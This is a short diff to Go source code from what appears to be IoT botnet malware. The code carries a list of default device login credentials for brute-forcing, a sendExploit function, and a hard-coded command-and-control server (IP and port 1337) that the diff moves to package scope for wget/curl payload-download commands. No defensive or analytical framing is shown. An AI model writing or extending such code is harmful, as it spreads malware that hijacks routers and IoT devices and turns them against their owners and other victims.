@@ -20,6 +20,11 @@ var syncWait sync.WaitGroup
 var statusLogins, statusAttempted, statusFound int
 var loginsString = []string{"adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:password123"}
 
+// Serveur C2 - séparer l'adresse IP et le port pour les commandes wget/curl
+var c2ServerIP = "51.68.128.169"
+var c2ServerPort = "1337"
+var c2Server = c2ServerIP + ":" + c2ServerPort
+
 // Sémaphore pour limiter les connexions concurrentes
 var sem = make(chan struct{}, 1000) // Limite à 1000 connexions concurrentes
 var mutex = &sync.Mutex{}
@@ -126,10 +131,7 @@ func sendExploit(target string) int {
 		"telnetd",
 	}
 
-	// Serveur C2 - séparer l'adresse IP et le port pour les commandes wget/curl
-	c2ServerIP := "51.68.128.169"
-	c2ServerPort := "1337"
-	c2Server := c2ServerIP + ":" + c2ServerPort
+	// Utiliser les variables globales c2ServerIP, c2ServerPort et c2Server définies au niveau du package
 	
 	// Chemins d'installation alternatifs
 	installPaths := []string{
